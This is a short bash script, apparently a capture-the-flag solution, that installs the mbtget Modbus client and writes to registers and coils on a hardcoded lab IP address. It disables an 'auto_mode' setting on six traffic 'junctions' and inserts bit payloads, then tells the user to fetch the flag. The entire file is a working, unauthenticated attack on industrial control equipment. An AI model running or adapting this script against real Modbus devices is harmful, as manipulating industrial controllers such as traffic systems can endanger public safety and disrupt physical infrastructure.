#!/bin/bash

if [ "$EUID" -ne 0 ]; then
	echo "[!] You are not running this program as root. If mbtget wasn't already installed by this script, installation might fail"
fi


### Installing mbtget ###
if [ -d "./mbtget" ]
then
	echo "[*] It seems we already installed mbtget in the current directory. Skipping installation"
	cd mbtget/scripts
else
	echo "[*] Installing mbtget in current directory..."
	git clone https://github.com/sourceperl/mbtget.git
	cd mbtget
	perl Makefile.PL
	make
	make install
	cd scripts
fi


### Exploit ###

ip="10.129.96.95"
automode="auto_mode:false"

ord() {
	LC_CTYPE=C printf '%d' "'$1"
	return $LC_CTYPE
}

for (( j=1; j<7; j++ )); do
	echo "[*] Setting auto_mode:false for junction $j\n"
	for (( i=0; i<${#automode}; i++ )); do
		./mbtget -w6 $(ord ${automode:$i:1}) $ip -a $i -u $j
	done
done

payload_j1="001001001100"
payload_j2="100001001001"
payload_j4="001001001100"
payload_j6="001001001100"


echo "[*] Inserting payload for junction 1\n"
for (( i=0; i<${#payload_j1}; i++ )); do
	let startaddr=571+$i
	./mbtget -w5 ${payload_j1:$i:1} $ip -a $startaddr -u 1
done

echo "[*] Inserting payload for junction 2\n"
for (( i=0; i<${#payload_j2}; i++ )); do
	let startaddr=1920+$i
	./mbtget -w5 ${payload_j2:$i:1} $ip -a $startaddr -u 2
done

echo "[*] Inserting payload for junction 4\n"
for (( i=0; i<${#payload_j4}; i++ )); do
	let startaddr=1266+$i
	./mbtget -w5 ${payload_j4:$i:1} $ip -a $startaddr -u 4
done

echo "[*] Inserting payload for junction 6\n"
for (( i=0; i<${#payload_j6}; i++ )); do
	let startaddr=886+$i
	./mbtget -w5 ${payload_j6:$i:1} $ip -a $startaddr -u 6
done

echo "[+] Exploit completed. Go get the flag @ http://$ip"
